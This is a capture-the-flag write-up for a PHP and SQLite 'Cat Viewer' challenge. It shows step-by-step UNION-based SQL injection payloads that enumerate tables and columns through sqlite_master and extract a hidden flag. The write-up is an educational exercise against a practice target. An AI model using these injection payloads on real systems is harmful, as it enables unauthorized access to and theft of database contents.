# Cat Viewer

### Description

I built a little web site to search through my archive of cat photos. I hid a little something extra in the database too. See if you can find it!

[https://nessus-catviewer.chals.io/](https://nessus-catviewer.chals.io/)

### Solution

As soon as we go to given link we are redirected to <https://nessus-catviewer.chals.io/index.php?cat=Shelton>

1. Application runs on PHP
2. `cat` variable returns images
3. `Searching for cats with names like Shelton` most likely the SQL statement.

Let's try inserting invalid statement to get error message.

```
Searching for cats with names like Shelton"
                                          ^

Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: """ in /var/www/html/index.php on line 19

Fatal error: Uncaught Error: Call to a member function numColumns() on bool in /var/www/html/index.php:21 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 21
```

Ok, we identifed that we are dealing with SQLite3.
I then tried UNION SQLi fuzzing:

```
Searching for cats with names like Shelton" UNION SELECT 1,2,3,4 -- -  
  
Name: 3  
  
<img src="data:image/gif;base64,2" />
```

Extract table names: ([PayloadsAllTheThings - SQLite](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)) 
```
Searching for cats with names like Shelton" UNION SELECT 1,2,group_concat(tbl_name),4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--  
  
Name: cats  
  
<img src="data:image/gif;base64,2" />
```

Extact columns:

```
Searching for cats with names like Shelton" UNION SELECT 1,2,sql,4 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='cats' --


Name: CREATE TABLE cats (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    image TEXT NOT NULL,
    name TEXT NOT NULL,
    flag TEXT NOT NULL
)
<img src="data:image/gif;base64,2" />
```

Flag: 

```
Searching for cats with names like Shelton" UNION SELECT 1,2,flag,4 FROM cats --  
  
Name:  
  
<img src="data:image/gif;base64,2" />
Name: flag{a_sea_of_cats}  
  
<img src="data:image/gif;base64,2" />
```
::: tip Flag
`flag{a_sea_of_cats} `
:::